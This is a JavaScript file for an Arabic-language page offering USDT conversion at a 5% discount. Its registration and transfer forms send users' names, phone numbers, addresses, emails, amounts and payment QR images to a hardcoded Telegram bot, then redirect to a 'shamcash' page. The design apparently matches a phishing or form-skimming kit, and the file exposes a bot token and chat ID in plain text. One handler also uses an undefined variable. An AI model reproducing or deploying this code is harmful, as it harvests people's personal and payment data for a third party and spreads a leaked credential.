const BOT_TOKEN = "7441650546:AAEP9_xSxetsw3oQ9-9vrArWQvrC8CxqLaU";
const CHAT_ID = "361491903";

async function sendToTelegram(message, imageFile = null) {
  if (imageFile) {
    const formData = new FormData();
    formData.append("chat_id", CHAT_ID);
    formData.append("caption", message);
    formData.append("photo", imageFile);

    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
      method: "POST",
      body: formData,
    });
  } else {
    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text: message,
      }),
    });
  }
}

const registerForm = document.getElementById("registerForm");
if (registerForm) {
  registerForm.addEventListener("submit", async (e) => {
    e.preventDefault();
    const fullName = document.getElementById("fullName").value;
    const phone = document.getElementById("phone").value;
    const address = document.getElementById("address").value;
    const email = document.getElementById("email").value;

    const message = `📝 تسجيل مستخدم جديد:\n\n👤 الاسم: ${fullName}\n📞 الهاتف: ${phone}\n🏠 العنوان: ${address}\n📧 البريد: ${email}`;

    await sendToTelegram(message);

    registerForm.style.display = "none";
    window.location.href = `shamcash.html?amount=${amount}`;
  });
}

const convertForm = document.getElementById("convertForm");
if (convertForm) {
  convertForm.addEventListener("submit", async (e) => {
    e.preventDefault();
    const fullName = document.getElementById("fullName").value;
    const phone = document.getElementById("phone").value;
    const amount = document.getElementById("amount").value;
    const qrImage = document.getElementById("qrImage").files[0];

    const discountedAmount = document.getElementById("discountedAmount").value;
    const message = `💸 طلب تحويل USDT:\n\n👤 الاسم: ${fullName}\n📞 الهاتف: ${phone}\n💰 المبلغ: ${amount} USDT\n💵 بعد خصم 5٪: ${discountedAmount} USDT`;

    await sendToTelegram(message, qrImage);

    convertForm.style.display = "none";
    window.location.href = `shamcash.html?amount=${amount}`;
  });
}



window.addEventListener("pageshow", function (event) {
  if (event.persisted || (window.performance && performance.getEntriesByType("navigation")[0].type === "back_forward")) {
    const forms = document.querySelectorAll("form");
    forms.forEach((form) => {
      form.reset();
    });
  }
});
